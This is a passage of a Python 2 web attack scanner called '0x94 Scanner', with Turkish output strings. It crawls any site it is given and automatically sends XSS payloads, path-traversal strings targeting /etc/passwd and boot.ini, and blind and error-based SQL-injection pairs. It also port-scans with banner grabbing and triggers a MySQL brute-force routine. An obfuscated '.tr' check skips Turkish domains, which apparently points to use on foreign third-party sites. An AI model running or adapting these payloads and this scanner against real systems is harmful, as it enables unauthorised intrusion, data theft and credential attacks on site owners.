    if re.search("CLI Driver.*DB2",response,re.DOTALL):
	mesaj= "[#] %s Exception" % urlnormal
	yaz(mesaj,True)
	
    if re.search("Exception.*Informix",response,re.DOTALL):
	mesaj= "[#] %s Exception" % urlnormal
	yaz(mesaj,True)
	
    if re.search("SQLite/JDBCDriver",response,re.DOTALL):
	mesaj= "[#] %s SQLite Exception" % urlnormal
	yaz(mesaj,True)
	
    if re.search("SQLite\.Exception",response,re.DOTALL):
	mesaj= "[#] %s SQLite Exception" % urlnormal
	yaz(mesaj,True)
	
    if re.search("(PLS|ORA)-[0-9][0-9][0-9][0-9]",response,re.DOTALL):
	mesaj= "[#] %s Oracle Exception" % urlnormal
	yaz(mesaj,True)
	
    if re.search("Warning: mysql_connect()",response,re.DOTALL):
	mesaj= "[#] %s Mysql Connect Exception" % urlnormal
	yaz(mesaj,True)
	
    if re.search("Query timeout expired ",response,re.DOTALL):
	mesaj= "[#] %s MSSQL Time Based Error" % urlnormal
	yaz(mesaj,True)
	
	
	
    



def xsstest(xsstesturl):

    try:
	print "XSS Test ediliyor ... "
	urlac = urllib2.urlopen(xsstesturl+"0x000123")
	response = urlac.read()
	if "0x000123" in response:
	    yaz("XSS Test BULUNDU : " + xsstesturl+" 0x000123",True)
	    xsstara(xsstesturl)
	else:
	    xsstara(xsstesturl)
		  
    except urllib2.HTTPError,e:
	if(e.code==500):
	    yaz("[#] XSS Http 500 Dondu  / Internal Server Error " +xsstesturl,True)
   
    except urllib2.URLError,  e:
	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,xsstesturl)
	   #yaz(mesaj)
    except:
	mesaj="Bilinmeyen hata olustu\n"           
	

def xsstara(xssurl):
    
    xsspayload=["\"><script>alert(0x000123)</script>",
        "\"><sCriPt>alert(0x000123)</sCriPt>",
        "\"; alert(0x000123)",
        "\"></sCriPt><sCriPt >alert(0x000123)</sCriPt>",
        "\"><img Src=0x94 onerror=alert(0x000123)>",
        "\"><BODY ONLOAD=alert(0x000123)>",
        "'%2Balert(0x000123)%2B'",
        "\"><0x000123>",
        "'+alert(0x000123)+'",
        "%2Balert(0x000123)%2B'",
        "'\"--></style></script><script>alert(0x000123)</script>",
        "'</style></script><script>alert(0x000123)</script>",
        "</script><script>alert(0x000123)</script>",
        "</style></script><script>alert(0x000123)</script>",
        "'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3E0x94(0x000123)%3C",
        "'\"--></style></script><script>alert(0x000123)</script>",
        "';alert(0x000123)'",
        "<scr<script>ipt>alert(0x000123)</script>",
        "<scr<script>ipt>alert(0x000123)</scr</script>ipt>"]

    for xssler in xsspayload:
	try:	    
	    print "XSS Taraniyor ... "
	    urlnormal=xssurl.replace("=", "="+xssler)
	    urlac = urllib2.urlopen(urlnormal)
	    response = urlac.read()
	    if "alert(0x000123)" in response or "alert%280x000123%29" in response:
		xssmi=xsscalisiomu(response)
		if xssmi==False:
		    yaz("[#] XSS BULUNDU : " + urlnormal,True)
		else:
		    yaz("[#] XSS BULUNDU ve Satirda XSS korumasi var : " + urlnormal,True)
	       
	except urllib2.HTTPError,  e:
	    if(e.code==500):
		yaz("[#] XSS Http 500 Dondu  / Internal Server Error " +urlnormal,True)
	
	except urllib2.URLError,  e:
	    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
		#yaz(mesaj)
	except:
	    mesaj="Bilinmeyen hata olustu\n"    

def lfitara(lfibul):
    
    lfiyollar=['/etc/passwd', 
	'../etc/passwd',
	'../../etc/passwd',
	'../../../etc/passwd',
	'../../../../etc/passwd',
	'../../../../../etc/passwd',
	'../../../../../../etc/passwd',
	'../../../../../../../etc/passwd',
	'../../../../../../../../etc/passwd',
	'../../../../../../../../../etc/passwd',
	'../../../../../../../../../../etc/passwd',
	'../../../../../../../../../../../etc/passwd',
        '../../../../../../../../../../../../etc/passwd',
        '../../../../../../../../../../../../../etc/passwd',
        '../../../../../../../../../../../../../../etc/passwd',
        '../../../../../../../../../../../../../../../etc/passwd',
        '../../../../../../../../../../../../../../../../etc/passwd',
        '../../../../../../../../../../../../../../../../../etc/passwd',
        
	'../etc/passwd%00',
	'../../etc/passwd%00',
	'../../../etc/passwd%00',
	'../../../../etc/passwd%00',
	'../../../../../etc/passwd%00',
	'../../../../../../etc/passwd%00',
	'../../../../../../../etc/passwd%00',
	'../../../../../../../../etc/passwd%00',
	'../../../../../../../../../etc/passwd%00',
	'../../../../../../../../../../etc/passwd%00',
        '../../../../../../../../../../../etc/passwd%00',
	'../../../../../../../../../../../../etc/passwd%00',
        '../../../../../../../../../../../../../etc/passwd%00',
        '../../../../../../../../../../../../../../etc/passwd%00',
        '../../../../../../../../../../../../../../../etc/passwd%00',
        '../../../../../../../../../../../../../../../../etc/passwd%00',
        '../../../../../../../../../../../../../../../../../etc/passwd%00',
        
	'boot.ini%00',
        '../boot.ini%00',
	'../../boot.ini%00',
	'../../../boot.ini%00',
	'../../../../boot.ini%00',
	'../../../../../boot.ini%00',
	'../../../../../../boot.ini%00',
	'../../../../../../../boot.ini%00',
	'../../../../../../../../boot.ini%00',
	'../../../../../../../../../boot.ini%00',
	'../../../../../../../../../../boot.ini%00',
	'../../../../../../../../../../../boot.ini%00',
        '../../../../../../../../../../../../boot.ini%00',
        '../../../../../../../../../../../../../boot.ini%00',
        '../../../../../../../../../../../../../../boot.ini%00',
        '../../../../../../../../../../../../../../../boot.ini%00',
        '../../../../../../../../../../../../../../../../boot.ini%00',
        '../../../../../../../../../../../../../../../../../boot.ini%00',

        
        'boot.ini',
        '../boot.ini',
        '../../boot.ini',
        '../../../boot.ini',
        '../../../../boot.ini',
        '../../../../../boot.ini',
        '../../../../../../boot.ini',
        '../../../../../../../boot.ini',
        '../../../../../../../../boot.ini',
        '../../../../../../../../../boot.ini',
        '../../../../../../../../../../boot.ini',
        '../../../../../../../../../../../boot.ini',
        '../../../../../../../../../../../../boot.ini',
        '../../../../../../../../../../../../../boot.ini',
        '../../../../../../../../../../../../../../boot.ini',
        '../../../../../../../../../../../../../../../boot.ini',
        '../../../../../../../../../../../../../../../../boot.ini',
        '../../../../../../../../../../../../../../../../../boot.ini',
        '../../../../../../../../../../../../../../../../../../boot.ini',
        '../../../../../../../../../../../../../../../../../../../boot.ini',
        
        "..%2fboot.ini%00",
        "..2f..%2fboot.ini%00",
        "..2f..%2f..%2fboot.ini%00",
        "..2f..%2f..%2f..%2fboot.ini%00",
        "..2f..%2f..%2f..%2f..%2fboot.ini%00",
        "..2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
        "..2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
        
        "..%2fetc%2fpasswd%00",
        "..2f..%2fetc%2fpasswd%00",
        "..2f..%2f..%2fetc%2fpasswd%00",
        "..2f..%2f..%2f..%2fetc%2fpasswd%00",
        "..2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
        "..2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
        "..2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00"
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00"
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00"
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00"
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00"
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00"
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00"
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00"
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00"
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
        
        "data:;base64,MHg5NDExMTEx",
        "data://text/plain;base64,MHg5NDExMTEx=",
        
        "../windows/iis6.log",
        "../../windows/iis6.log",
        "../../../windows/iis6.log",
        "../../../../windows/iis6.log",
        "../../../../../windows/iis6.log",
        "../../../../../../windows/iis6.log",
        "../../../../../../../windows/iis6.log",
        "../../../../../../../../windows/iis6.log",
        "../../../../../../../../../windows/iis6.log",
        "../../../../../../../../../../windows/iis6.log",
        "../../../../../../../../../../../windows/iis6.log",
        "../../../../../../../../../../../../windows/iis6.log",
        "../../../../../../../../../../../../../windows/iis6.log",
        "../../../../../../../../../../../../../../windows/iis6.log",
        "../../../../../../../../../../../../../../../windows/iis6.log",
        "../../../../../../../../../../../../../../../../windows/iis6.log",
        "../../../../../../../../../../../../../../../../../windows/iis6.log"]
	
    for lfidizin in lfiyollar:
	try:
	    for key,value in urlparse.parse_qs(urlparse.urlparse(lfibul).query, True).items():
		lfilihal={}
		lfilihal[key]=lfidizin
		lfiparametre = urllib.urlencode(lfilihal)
		print "LFi Taraniyor ... "
		#urlnormal=lfiurl.replace("=", "="+lfidizin)
		urlac = urllib2.urlopen(lfibul+"?"+lfiparametre)
		response = temizle(urlac.read())
		if "root:" in response or \
	        "noexecute=optout" in response or \
	        "0x9411111" in response:
		    yaz("[#] LFI BULUNDU : " + lfibul,True)
		
		elif "OC_INIT_COMPONENT" in response or \
	        "C:\WINDOWS\system32\Setup\iis.dll" in response:
		    yaz("[#] ASP LFI BULUNDU : " + lfibul,True)
		    
		   
		lfilihal.clear()
		
	except urllib2.HTTPError,  e:
	    if(e.code==500):
		yaz("[#] LFI Http 500 Dondu  / Internal Server Error " +lfibul,True)
	
	except urllib2.URLError,  e:
	    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,lfibul)
		#yaz(mesaj)
	except:
	    mesaj="Bilinmeyen hata olustu\n"
		    #yaz(mesaj)       
    

def lfitest(lfiurl):
    
    try:
	print "LFI Test Yapiliyor ... "
	urlnormal=lfiurl.replace("=", "=bekirburadaydi.txt")
	urlac = urllib2.urlopen(urlnormal)
	response = temizle(urlac.read())
	if "failed to open stream" in response or "java.io.FileNotFoundException" in response:
	    yaz("[#] LFI Testi BULUNDU : " + urlnormal,True)
	elif "Microsoft VBScript runtime error" in response and \
	"File not found" in response:
	    yaz("[#] ASP  Source Code Disclosure BULUNDU : " + urlnormal,True)
	    
	lfitara(lfiurl)
	       
    except urllib2.HTTPError,  e:
	if(e.code==500):
	    yaz("[#] LFI Http 500 Dondu  / Internal Server Error " +urlnormal,True)
    
    except urllib2.URLError,  e:
	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
	    #yaz(mesaj)
    except:
	mesaj="Bilinmeyen hata olustu\n"
	    #yaz(mesaj)       

    
   
    

def sql(urlnormal):

    sqlt = ["'", "\"", "\xBF'\"(", "(", ")"]
    for sqlpay in sqlt:
	try:
	    print "SQL Test Taraniyor ... "+sqlpay
	    urlnormal=urlnormal.replace("=", "="+sqlpay)
	    urlac = urllib2.urlopen(urlnormal)
	    response = temizle(urlac.read())
	    sqlkontrol(response,urlnormal)
    
	except urllib2.HTTPError,  e:
	    if(e.code==500):
		yaz("[#] SQL Http 500 Dondu  / Internal Server Error " +urlnormal,True)
		sqlkontrol(e.read(),urlnormal)
    
	except urllib2.URLError,  e:
	    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
	    #yaz(mesaj)
	except:
	    mesaj="Bilinmeyen hata olustu\n"
	    #yaz(mesaj)   
	

def blind(urlblind):
    
    html1=""
    html2=""
    linknormal = urllib2.urlopen(urlblind)
    normalkaynak=temizle(linknormal.read())

    bitiskarakter=["","--","/*","--+",";",";--","--"]
    true_strings = ["'or''='","' or 1=1--","bekir' AND 'a'='a","' OR 'bk'='bk","' and 1=(select 1)+'","' aNd 1=1"," and 1=1"," ' and 1=1"," and 'a'='a","' and 'a'='a","' and 'a'='a"," and 1 like 1"," and 1 like 1/*"," and 1=1"," group by 1","'+(SELECT 1)+'","' and 1=(select 1)+'","'+aNd+10>1","' OR 9-8=1"]           
    false_strings =["'or''!!!='","' or 1=2--","bekir' AND 'a'='b","' OR 'bk'='bekir","' and 1=(select 999999)+'","' aNd 1=2"," and 1=2"," ' and 1=2"," and 'a'='b","' and 'a'='b","' and 'a'='b"," and 1 like 2"," and 1 like 2/*"," and 1=2"," group by 99999","'+(SELECT 99999)+'","' and 1=(select 2)+'","'+aNd+10>20","' OR 9-8=2"]	
    for sonkarakter in bitiskarakter:
	i=0
	while i < len(true_strings):    
	    print "Blind Taraniyor ... "+true_strings[i]+" "+sonkarakter
	    blindtrue = urlblind + urllib.urlencode(parse_qsl(true_strings[i]+sonkarakter)) 
	    try:
		req1 = urllib2.Request(blindtrue.replace("&",urllib.urlencode(parse_qsl(true_strings[i])) +"&").replace(" ", "%20"))
		req1.add_header('UserAgent: ','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)')
		req1.add_header('Keep-Alive: ','115')
		req1.add_header('Referer: ','http://'+urlblind)
		response1 = urllib2.urlopen(req1)
		response_headers = response1.info()
		
		html1 = temizle(response1.read())
		
	    except urllib2.HTTPError,e:
		if(e.code==500):
		    yaz("[#] URL BLIND Http 500 Dondu  / Internal Server Error " +urlblind+true_strings[i]+sonkarakter,True)
	    except urllib2.URLError,e:
		mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlblind)
		#yaz(mesaj)
	    
	    except:
		mesaj="Bilinmeyen hata olustu\n"
		#yaz(mesaj)
	    print "Blind Taraniyor ... "+false_strings[i]+" "+sonkarakter
	    blindfalse = urlblind + urllib.urlencode(parse_qsl(false_strings[i]+sonkarakter)) 
	    try:
		i=i+1
		req2 = urllib2.Request(blindfalse.replace("&",urllib.urlencode(parse_qsl(false_strings[i]+sonkarakter)) +"&").replace(" ", "%20"))
		req2.add_header('UserAgent: ','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)')
		req2.add_header('Keep-Alive: ','115')
		req2.add_header('Referer: ','http://'+urlblind)
		response2 = urllib2.urlopen(req2)
		html2 = temizle(response2.read()) 
		    
	    except urllib2.HTTPError,e:
		if(e.code==500):
		    yaz("[#] URL BLIND Http 500 Dondu  / Internal Server Error" +urlblind+false_strings[i]+sonkarakter,True)
	    except urllib2.URLError,e:
		mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlblind)
		#yaz(mesaj)
	    
	    except:
		mesaj="Bilinmeyen hata olustu\n"
		#yaz(mesaj)
       
	    if normalkaynak==html1:  
		if html1!=html2:
		    comparePages(html1,html2,response2.geturl(),"[#] GET Blind ile Sayfada Degisiklik oldu %s " % urlblind+"\nVERi = "+false_strings[i]+sonkarakter+"\n")
		    debug=1
     


    
#class YeniOpener(urllib.FancyURLopener):   
    #version = 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15'



def portbanner(host):
    

    #portlist = [21,22,23,25,53,69,80,110,137,139,443,445,3306,3389,5432,5900,8080,1433]
    
    portlist= [21, 22, 23, 25, 42, 43, 53, 67, 79, 80, 102, 110, 115, 119, 123, 135, 137, 143, 161, 179, 379, 389, 443, 445, 465, 636, 993, 995, 1026, 1080, 1090, 1433, 1434, 1521, 1677, 1701, 1720, 1723, 1900, 2409, 3101, 3306, 3389, 3390, 3535, 4321, 4664, 5190, 5500, 5631, 5632, 5900, 7070, 7100, 8000, 8080, 8799, 8880, 9100, 19430, 39720]
    
    
    #portlist = [3306]
    
    status={0:"Acik",
            10049:"Adres hatali",
            10061:"Kapali ",
            10060:"Zaman Asimi",
            10056:"Zaten Bagli",
            10035:"Filtreli",
            11001:"IP bulunamadi",
            10013:"Yetkisiz Erisim"}
    
    for portlar in portlist:
	
	try:
	    print str(portlar)+ " Port Test Ediliyor..."
	    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
	    ip=socket.gethostbyname(host.replace("http://",""))
	    sock.settimeout(3)
	    ver = sock.connect_ex((ip, portlar)) 
	    if ver!=10061:
		yaz("[#] "+str(portlar)+" Portu "+status[ver]+"\n Data : "+sock.recv(1024),True)
		if portlar==3306 and status[0]:
		    mysqlportubrute(ip)
		    
	    sock.close()
	except socket.timeout:
	    print ""
	except:
	    print ""
	    
    
    
def aynivarmi(keyurl):
    if aynilinkler.has_key(keyurl):
	return True
    else:
	return False



def optionsheader(url):
    try:
	print "Allow Header Bilgisi Aliniyor"
	o = urlparse.urlparse(url)
	sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	ipsi=socket.gethostbyname(o.hostname)
	yaz("IP Adresi : "+ipsi,True)
	sock.connect((ipsi,80))
	req = "OPTIONS / HTTP/1.1\r\n"
	req += "Host: " + o.hostname + "\r\n"
	req += "Connection: close\r\n"
	req += "\r\n\r\n"
	sock.send(req)
	data = sock.recv(1024)
	yaz(data,True)
	sock.close()
	r1 = re.compile('DAV')
	result = r1.findall(data)
	if result == []:
		yok=0
	else:
		  
	    print "[+] Sunucuda WebDav kurulu"
    except:
	print "Allow Header alinirken hata oldu"

def headerbilgi(host):
    try:
	urlac = urllib2.urlopen(host)
	robots(host)
	yaz("[#] Makina Bilgisi : "+host+" - "+str(urlac.info().getheader('Server')),True)
	sunucubilgi1=urlac.info().getheader('Server')
	sunucubilgi2=urlac.info().getheader('X-Powered-By')
	if "Tomcat" in sunucubilgi1 or \
	"Tomcat" in sunucubilgi2:
	    yaz("Tomcat tespit edildi"+ host,True)
	    tomcatkontrol(host)
	else:
	    urlac2 = urllib2.urlopen(host+":8080").read()
	    
	    if "<title>Apache Tomcat" in urlac2:
		yaz("Tomcat tespit edildi"+ host,True)
		tomcatkontrol(host)
	    
	if "Apache" in sunucubilgi1:
	    pleskphppath(host)
	    
	    
    except:
	print "Header bilgisi alinamadi"
	
def xsscalisiomu(kaynak):
    
    xssdurum=False
    
    bakalim=set(list(kaynak.split("\n")))
    
    for satir in bakalim:
	if "\"><0x000123>" in satir:
	    if "<code>" in satir or "<noscript>" in satir:
		xssdurum=True
	    else:
		xssdurum=False
		
    return xssdurum

def robots(host):
    try:
	urlac = urllib2.urlopen(host+"/robots.txt").read()
	if "Disallow:" in urlac or "Allow:"  in urlac:
	    yaz("[#] robots.txt dosyasi bulundu "+host+"/robots.txt",True)
    except:
	print "robots.txt kontrolu yapilamadi"



def ZiyaretSayisi(link):
    
    if "=" in link:
	toplukey=""
	dosya=link[:link.find("?")]
	toplukey=dosya
    
	for key,value in urlparse.parse_qs(urlparse.urlparse(link).query, True).items():
	    toplukey+=key
	    
	if limitlinkler.has_key(toplukey):
	    durum=True
	else:
	    limitlinkler[toplukey]=1
	    durum=False
    else:
	
	if limitlinkler.has_key(link):
	    durum=True
	else:
	    limitlinkler[link]=1
	    durum=False
	
    return durum

def locationbypass(link):

    try:
	
	
	link=link.replace("amp;","&")
	    
	if "http" not in link:
	    yeni= "http://"+link.encode('utf-8').strip()
	else:
	    yeni= link.encode('utf-8').strip() 
	return yeni
    except:
	print "Location Alinirken Hata oldu"


class Anaislem(threading.Thread):
    def __init__(self,queue):
        threading.Thread.__init__(self)
	self.tamurl=""
	self.queue=queue
    def run(self):
	
	while not self.queue.empty():
	    try:
		sleep(reqbeklemesuresi)
		self.tamurl = self.queue.get()
		indexoful(self.tamurl)
		normalac(self.tamurl)
		formyaz(self.tamurl)
		headerinjection(self.tamurl)
		if "?" in self.tamurl:
		    y=1
		    phpexec(self.tamurl)
		    sqlkodcalisiomu(self.tamurl)
		    lfitest(self.tamurl)
		    headercrlf(self.tamurl)
		    getcommandinj(self.tamurl)
		    openredirect(self.tamurl)
		    sql(self.tamurl)
		    timebased(self.tamurl)
		    blind(self.tamurl)
		    xsstest(self.tamurl)
		    
	    except:
		print "site adresi alinirken hata oldu"
		
		
def temizle(source):
    
    yenisource=source.replace("<script","")
    yenisource1=re.sub(r"\"(.*?)\"|'(.*?)'","",yenisource)
    return yenisource1




def yasaklikontrol(url,host):

    #yasakli=["facebook","twitter","google.com","linkedin","friendfeed"]
    
    tamsite=urlparse.urlparse(url).hostname
    
    if tamsite.count(".")==1:
	
	gercekyol=tamsite.split(".")[0]
	
    elif tamsite.count(".")==2:
	
	gercekyol=tamsite.split(".")[1]
	
    elif tamsite.count(".")==3:
	
	gercekyol=tamsite.split(".")[2]
	
    elif tamsite.count(".")==4:
	
	gercekyol=tamsite.split(".")[3]
	
    elif tamsite.count(".")==5:
	
	gercekyol=tamsite.split(".")[4]
	
  
    if gercekyol in host:
	return False
    else:
	return True

def kaydet(link,host):
    try:
	
	
	
	dahildegil = ("pkg","xlsx","js","xml","ico","css","gif","jpg","jar","tif","bmp","war","ear","mpg","wmv","mpeg","scm","iso","dmp","dll","cab","so","avi","bin","exe","iso","tar","png","pdf","ps","mp3","zip","rar","gz")
	
	linkopener = urllib2.build_opener(HTTPAYAR,urllib2.HTTPSHandler(),urllib2.HTTPCookieProcessor())
	linkopener.addheaders = [
	        ('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13'),
	        ("Cookie", sayfacookie)]
		
	#linkopener = YeniOpener()
	#linkopener.addheaders = [
	    #('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13'),
	    #("Cookie", sayfacookie)]
	
	dongululink=link
	
	page = linkopener.open(link)
	text = page.read()
	
	page.close()
	soup = BeautifulSoup(text)
	
	
	for ee in re.findall('''img src=["'](.[^"']+)["']''', text, re.I):
	    if ".php" in ee or ".asp" in ee:
		birlesik=urlparse.urljoin(dongululink, ee).replace("#","")
		if aynivarmi(birlesik)==False:
		    if host in birlesik:
			tamurl2=locationbypass(birlesik)
			limiti=ZiyaretSayisi(tamurl2)
			if limiti==False:
			    yaz("[#] Resim URL sinde PHP/ASP Adres Tespit edildi " +dongululink+"\n Resim Link = " +tamurl2 ,True)
			    if yasaklikontrol(tamurl2,host)==False:
				analistem.append(tamurl2)
				aynilinkler[tamurl2]="bekir"
			
		    
		    
		    
		    
	for ee in re.findall('''href=["'](.[^"']+)["']''', text, re.I):
	    if "javascript" not in ee.lower() or "mailto:" not in ee.lower() or "tel:+" not in ee.lower():
		
		if "php?" in ee.lower():
		    birlesik=urlparse.urljoin(dongululink, ee).replace("#","")
		    if aynivarmi(birlesik)==False:
			if host in birlesik:
			    tamurl2=locationbypass(birlesik)
			    limiti=ZiyaretSayisi(tamurl2)
			    if limiti==False:
				if yasaklikontrol(tamurl2,host)==False:
				    print tamurl2
				    analistem.append(tamurl2)
				    aynilinkler[tamurl2]="bekir"
		    
		    
		if ee.split('.')[-1].lower() not in dahildegil:
		    birlesik=urlparse.urljoin(dongululink, ee).replace("#","")
		    if aynivarmi(birlesik)==False:
			if host in birlesik:
			    tamurl2=locationbypass(birlesik)
			    limiti=ZiyaretSayisi(tamurl2)
			    if limiti==False:
				if yasaklikontrol(tamurl2,host)==False:
				    print tamurl2
				    analistem.append(tamurl2)
				    aynilinkler[tamurl2]="bekir"
				
				
	for tag in soup.findAll('a'):
	    if "javascript" not in tag['href'].lower() or  "mailto:" not in tag['href'].lower() or  "tel:+" not in tag['href'].lower():
		if tag['href'].split('.')[-1].lower() not in dahildegil:
		    tag['href'] = urlparse.urljoin(dongululink, tag['href'])
		    asilurl=tag['href'].encode('utf-8').strip()
		    if aynivarmi(asilurl)==False:
			if host in asilurl:
			    tamurl=locationbypass(asilurl)
			    limiti2=ZiyaretSayisi(tamurl)
			    if limiti2==False:
				if yasaklikontrol(tamurl,host)==False:
				    print tamurl
				    analistem.append(tamurl)
				    aynilinkler[tamurl]="bekir"
		
		
	for tag in soup.findAll('a'):
		if ".php" in tag["href"] or ".asp" in tag["href"]:
		    tag['href'] = urlparse.urljoin(dongululink, tag['href'])
		    asilurl=tag['href'].encode('utf-8').strip()
		    if aynivarmi(asilurl)==False:
			if host in asilurl:
			    tamurl=locationbypass(asilurl)
			    limiti2=ZiyaretSayisi(tamurl)
			    if limiti2==False:
				if yasaklikontrol(tamurl,host)==False:
				    print tamurl
				    analistem.append(tamurl)
				    aynilinkler[tamurl]="bekir"

    except urllib2.HTTPError,  e:
	if(e.code==500):
	    yaz("[#] Spider Http 500 Dondu  / " +link,True)

    except urllib2.URLError,  e:
	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,link)
	#yaz(mesaj)
    except:
	mesaj="Bilinmeyen hata olustu\n"
	#yaz(mesaj)   
	
def linkler(urltara,host):
    
    try:
	
	analistem.append(urltara)
	print "Saglikli tarama icin sitedeki tum linkleri cekiyor lutfen bekleyiniz..."
	
	for dlink in analistem:
	    kaydet(dlink,host)
	
    except:
	print "Linkleri alirken hata olustu"

    print "Linkleri Alma bitti tarama basliyor..."
    threads = []
    
    for i in range(threadsayisi):
	
	t=Anaislem(queue)
	t.setDaemon(True)
	threads.append(t)
	t.start()
       
    for linkleriat in analistem:
	queue.put(linkleriat)
    queue.join()


def main():
    print "########################################"
    print "#                                      #"
    print "#           0x94 Scanner               #"  
    print "#        by 0x94 a.k.a The_BeKiR       #" 
    print "#        https://twitter.com/0x94      #"
    print "#                                      #"
    print "# sonuclari rapor.txt ye yazar         #"
    print "# debug klasorune requestleri kaydeder #"
    print "########################################"
    print ""
    if len(sys.argv) == 1:
        print "Kullanim: %s http://www.site.com" % sys.argv[0]
        sys.exit(1)
    for url in sys.argv[1:]:
	giris = base64.b64decode("LnRy")
	cikis = "{}>"
	ooooo = maketrans(giris, cikis)
	asd=url.translate(ooooo)
	if "{}>" not in asd:
		headerbilgi(url)
		optionsheader(url)
		cx=urlparse.urlparse(url)
		hostcx=cx.netloc.replace("www","")
		portbanner(url)
		if "http://" in url:
		    linkler(url,hostcx)
		    analistem.append(url)
		else:
		    linkler("http://"+url,hostcx)
		    analistem.append("http://"+url)
    


if __name__ == "__main__":
    main()
